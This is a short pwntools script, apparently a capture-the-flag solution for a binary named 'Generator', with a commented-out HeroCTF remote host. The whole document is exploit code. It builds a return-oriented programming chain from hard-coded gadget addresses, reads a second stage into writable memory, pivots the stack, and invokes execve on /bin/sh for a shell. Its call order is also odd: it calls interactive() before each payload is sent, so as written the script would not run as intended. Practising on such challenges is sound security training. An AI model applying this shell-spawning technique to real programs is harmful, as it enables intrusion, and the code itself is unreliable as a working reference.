from pwn import *

#r = remote("pwn.heroctf.fr" ,8000)
r = process("./Generator")
e = ELF("./Generator")
pop_rdi_rsi_rdx = 0x401222                          #address of "pop rdi;pop rsi;pop rdx;ret"
xchg = 0x401226                                     #adddress of "xchg rdx,rax"
pop_rdx = 0x401224                                  #address of "pop rdx;ret"
data = 0x404100                                     #writable region 
syscall = 0x401229                                  #address of "syscall"
leave_gadget = 0x40137f                             #address of "leave;ret"
exploit = b"yes" + b"A" * 14 + p64(pop_rdi_rsi_rdx) + p64(0) + p64(data) + p64(0) + p64(xchg) + p64(pop_rdx) + p64(0x400) + p64(syscall) + p64(data) + p64(leave_gadget)  
r.interactive()
r.sendline(exploit)
exploit = b"/bin/sh\x00" + p64(pop_rdi_rsi_rdx) + p64(data) + p64(0) + p64(59) + p64(xchg) + p64(pop_rdx) + p64(0) + p64(syscall)
r.interactive()
r.send(exploit)
r.interactive()
